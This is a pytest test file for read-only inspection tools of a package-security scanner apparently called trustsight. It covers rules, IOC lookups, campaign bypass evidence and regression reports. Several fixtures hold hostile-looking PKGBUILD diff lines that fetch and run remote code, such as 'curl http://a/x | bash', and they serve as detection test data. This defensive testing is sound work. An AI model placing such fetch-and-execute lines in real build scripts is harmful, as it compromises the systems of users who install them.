"""Read-only registry, corpus and artifact inspection."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from harness import introspect


@pytest.fixture
def corpus(monkeypatch, tmp_path):
    import trustsight.db as db_module

    monkeypatch.setattr(db_module, "DATA_DIR", tmp_path, raising=False)
    db_module.init_db()
    return tmp_path


def test_maintainer_transitions_decode_the_recorded_pair(corpus):
    from trustsight.db import record_property_transition

    record_property_transition(
        "adopted", "maintainer", "oldm", "newm", "2026-05-01T00:00:00")
    out = introspect.maintainer_transitions("adopted")
    assert out["available"] is True
    assert out["transitions"] == [{
        "old": "oldm", "new": "newm", "observed_at": "2026-05-01T00:00:00",
    }]


def test_maintainer_transitions_reports_a_cold_database(monkeypatch, tmp_path):
    import trustsight.db as db_module

    monkeypatch.setattr(db_module, "DATA_DIR", tmp_path / "missing", raising=False)
    out = introspect.maintainer_transitions("nope")
    assert out["available"] is False
    assert out["transitions"] == []


def test_rule_info_and_rules_list_come_from_the_registry():
    info = introspect.rule_info(["H044", "R001", "nope"])
    assert info["count"] == 3
    h044 = info["rules"][0]
    assert h044["found"] is True
    assert h044["id"] == "H044"
    assert h044["uid"]
    assert h044["category"] == "maintainer-and-metadata"
    assert info["rules"][2] == {"requested": "nope", "found": False}

    listed = introspect.rules_list(category="maintainer-and-metadata")
    assert listed["count"] > 0
    assert all(r["category"] == "maintainer-and-metadata" for r in listed["rules"])


def test_ioc_lookup_and_status_read_the_local_store(corpus):
    from trustsight.db import get_connection

    with get_connection() as conn:
        conn.execute(
            "INSERT INTO ioc_entries (type, value, source) "
            "VALUES ('package', 'evil-pkg', 'test')")
        conn.commit()

    looked_up = introspect.ioc_lookup("package", "evil-pkg")
    assert looked_up["available"] is True
    assert looked_up["count"] == 1
    assert looked_up["matches"][0]["source"] == "test"

    status = introspect.ioc_status()
    assert status["available"] is True
    assert status["by_type"] == {"package": 1}
    assert status["sources"] == ["test"]


def test_data_status_reports_counts_and_metadata(corpus):
    from trustsight.db import set_metadata

    set_metadata("seed_version", "2026-09-24")
    out = introspect.data_status()
    assert out["available"] is True
    assert out["metadata"]["seed_version"] == "2026-09-24"
    assert out["packages"] == 0
    assert out["snapshots"] == 0


def test_data_status_reports_a_cold_database(monkeypatch, tmp_path):
    import trustsight.db as db_module

    monkeypatch.setattr(db_module, "DATA_DIR", tmp_path / "missing", raising=False)
    out = introspect.data_status()
    assert out["available"] is False
    assert "not found" in out["error"]


def test_shape_of_is_content_normalised():
    first = introspect.shape_of(
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n+  eval $(curl http://a/x)  \n")
    second = introspect.shape_of(
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n+  eval $(curl http://b/y)  \n")
    assert first["shape"] == second["shape"]
    assert first["shape_fingerprint"] == second["shape_fingerprint"]
    assert first["behavioral"] == []


def _write_campaign(root: Path, diff: str, digest: str) -> None:
    campaign = root / "campaigns" / "demo"
    campaign.mkdir(parents=True)
    (campaign / "record.json").write_text(json.dumps({
        "campaign": "demo",
        "environment": {"trustsight_version": "0.23.0"},
        "bypass_hashes": [digest],
        "expected_rules": ["R001"],
    }))
    (campaign / "evidence.jsonl").write_text(json.dumps({
        "attempt": 1,
        "status": "bypass",
        "diff": diff,
        "diff_sha256": digest,
        "judge": {"catching_rules": ["R001"], "coverage_gaps": [],
                  "verdict": "bypass", "rationale": "clean"},
    }) + "\n")


def test_list_and_match_bypass(tmp_path):
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n+curl http://a/x | bash\n"
    digest = introspect.diff_hash(diff)
    _write_campaign(tmp_path, diff, digest)
    (tmp_path / "regression").mkdir()
    (tmp_path / "regression" / "report.json").write_text(json.dumps({
        "bypasses": [{"diff_hash": digest, "state": "open",
                      "status": "bypass", "closing_version": "0.23.0"}],
    }))

    listed = introspect.list_bypasses(tmp_path)
    assert listed["count"] == 1
    assert listed["bypasses"][0]["state"] == "open"

    matched = introspect.match_bypass(diff, tmp_path)
    assert matched["known"]["original_campaign"] == "demo"
    assert matched["diff_hash"] == digest


def test_archive_report_filters_and_reads_closure(tmp_path):
    from harness.archive import Archive

    archive = Archive(saturation=1)
    archive.observe("R001", ("eval",), diff="+eval x", campaign="demo",
                    attempt=1, version="0.23.0")
    archive.set_patch_status("R001", ("eval",), "verified", "0.23.0")
    archive.save(tmp_path / "archive.json")

    report = introspect.archive_report(tmp_path, version="0.23.0")
    assert report["count"] == 1
    assert report["cells"][0]["rule"] == "R001"
    assert report["cells"][0]["closed"] is True

    assert introspect.archive_report(
        tmp_path, version="0.23.0", only_open=True)["count"] == 0


def test_campaign_evidence_filters_and_hides_the_diff(tmp_path):
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n+curl http://a/x | bash\n"
    digest = introspect.diff_hash(diff)
    _write_campaign(tmp_path, diff, digest)

    out = introspect.campaign_evidence(tmp_path, "demo", rule="R001")
    assert out["count"] == 1
    assert "diff" not in out["attempts"][0]
    assert out["attempts"][0]["catching_rules"] == ["R001"]

    with_diff = introspect.campaign_evidence(
        tmp_path, "demo", include_diff=True)
    assert with_diff["attempts"][0]["diff"] == diff

    assert introspect.campaign_evidence(
        tmp_path, "demo", status="detected")["count"] == 0


def test_run_history_reads_the_regression_report(tmp_path):
    (tmp_path / "regression").mkdir()
    path = tmp_path / "regression" / "report.json"
    path.write_text(json.dumps({
        "environment": {"trustsight_version": "0.23.0"},
        "total": 3, "open": 1, "closed": 2, "inconclusive": 0,
        "unreplayable": 0,
    }))
    out = introspect.run_history(tmp_path, "regression")
    assert out["count"] == 1
    assert out["total"] == 1
    assert out["truncated"] is False
    assert out["runs"][0]["open"] == 1


def test_ioc_lookup_rejects_an_unknown_type(corpus):
    out = introspect.ioc_lookup("not-a-type", "x")
    assert "error" in out
    assert "package" in out["valid_types"]


def test_names_with_control_characters_or_excess_length_are_refused():
    assert introspect.maintainer_transitions("a\x00b")["error"]
    assert introspect.maintainer_transitions("a" * 300)["error"]
    assert "error" in introspect.campaign_evidence(
        Path("."), "a\x00b")


def test_a_malformed_campaign_record_is_reported_not_raised(tmp_path):
    bad = tmp_path / "campaigns" / "bad"
    bad.mkdir(parents=True)
    (bad / "record.json").write_text("{not json")
    out = introspect.list_bypasses(tmp_path)
    assert out["available"] is False
    assert "JSONDecodeError" in out["error"]


def test_a_malformed_archive_is_reported_not_raised(tmp_path):
    (tmp_path / "archive.json").write_text("{not json")
    out = introspect.archive_report(tmp_path)
    assert out["available"] is False
    assert "not valid JSON" in out["error"]


def test_run_history_bounds_its_result(tmp_path):
    (tmp_path / "regression").mkdir()
    (tmp_path / "regression" / "report.json").write_text(json.dumps({
        "environment": {}, "total": 0, "open": 0, "closed": 0,
        "inconclusive": 0, "unreplayable": 0,
    }))
    (tmp_path / "benign").mkdir()
    (tmp_path / "benign" / "report.json").write_text(json.dumps({
        "environment": {}, "scanned": 0, "flagged": 0,
    }))
    out = introspect.run_history(tmp_path, "all", limit=1)
    assert out["total"] == 2
    assert out["count"] == 1
    assert out["truncated"] is True
    assert len(out["runs"]) == 1


def test_campaign_evidence_skips_unparseable_lines(tmp_path):
    campaign = tmp_path / "campaigns" / "demo"
    campaign.mkdir(parents=True)
    (campaign / "evidence.jsonl").write_text(
        "not json\n" + json.dumps({"attempt": 1, "status": "bypass"}) + "\n")
    out = introspect.campaign_evidence(tmp_path, "demo")
    assert out["count"] == 1
    assert out["attempts"][0]["attempt"] == 1


def test_invalid_filters_are_reported_not_silently_ignored(tmp_path):
    (tmp_path / "campaigns").mkdir()
    assert "error" in introspect.list_bypasses(tmp_path, since="not-a-version")
    assert "error" in introspect.archive_report(tmp_path, only_open=True)
    assert "error" in introspect.run_history(tmp_path, "not-a-kind")


def test_oversized_diffs_are_refused():
    from harness.sanitizer import MAX_DIFF_BYTES

    huge = "+x\n" * (MAX_DIFF_BYTES // 3 + 10)
    assert "error" in introspect.shape_of(huge)
    assert "error" in introspect.match_bypass(huge, Path("."))


def test_inspection_never_writes_the_operator_database(corpus):
    """H9: the read-only tools open the corpus mode=ro and change nothing."""
    import trustsight.db as db_module

    db_module.record_property_transition(
        "adopted", "maintainer", "oldm", "newm", "2026-05-01T00:00:00")
    with db_module.get_connection() as conn:
        conn.commit()
        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        conn.execute("PRAGMA journal_mode=DELETE")
    db_module.close_connections()

    path = corpus / "trustsight.db"
    before = path.read_bytes()
    path.chmod(0o444)
    try:
        assert introspect.maintainer_transitions("adopted")["available"] is True
        assert introspect.ioc_status()["available"] is True
        assert introspect.data_status()["available"] is True
    finally:
        path.chmod(0o644)
    assert path.read_bytes() == before
    assert not (corpus / "trustsight.db-wal").exists()
    assert not (corpus / "trustsight.db-shm").exists()
